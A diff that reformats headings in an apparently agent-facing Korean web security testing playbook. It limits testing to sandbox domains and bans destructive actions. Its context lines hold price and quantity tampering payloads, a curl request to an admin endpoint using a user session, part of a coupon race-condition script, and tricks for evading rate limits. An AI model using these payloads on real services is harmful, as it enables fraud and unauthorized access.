@@ -1,6 +1,6 @@
 **계정 요구사항:** 최소 2개 — 계정 A (리소스 소유자), 계정 B (비소유자/외부 공격자).
 
-**[필수] 쓰기 작업 안전 수칙:**
+#### [필수] 쓰기 작업 안전 수칙
 - sandbox 도메인 한정 (prod/cbt/staging 절대 금지)
 - 파괴적 행위 금지 (탈퇴, 비밀번호 변경, 이메일 변경, 실제 결제, 영구 삭제)
 - 테스트 데이터 직접 생성 (기존 데이터 변경 금지)
@@ -13,7 +13,7 @@
 
 ### `PRICE_TAMPER` — 가격/수량 조작
 
-**기본 페이로드 (request body 변조):**
+#### 기본 페이로드 (request body 변조)
 ```json
 {"productId":"<id>","quantity":1,"price":-10000}        # 음수 금액
 {"productId":"<id>","quantity":0,"price":1}             # 0 수량
@@ -48,7 +48,7 @@ curl -si "https://target/api/admin/users" -H "Cookie: session=USER"
 
 ### `RACE_CONDITION` — 레이스 / TOCTOU
 
-**기본 페이로드 (단일 Bash + 백그라운드 — 지침 5 예외):**
+#### 기본 페이로드 (단일 Bash + 백그라운드 — 지침 5 예외)
 ```bash
 URL="https://target/api/coupons/apply"
 SESSION="<계정A 세션>"
@@ -87,7 +87,7 @@ for i in $(seq 1 50); do
 done
 ```
 
-**우회:**
+#### 우회
 - `X-Forwarded-For: $((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))` (IP rate limit 우회)
 - 재로그인 후 카운터 초기화 확인 (세션 기반)
 - 다중 sub-account/email로 분산
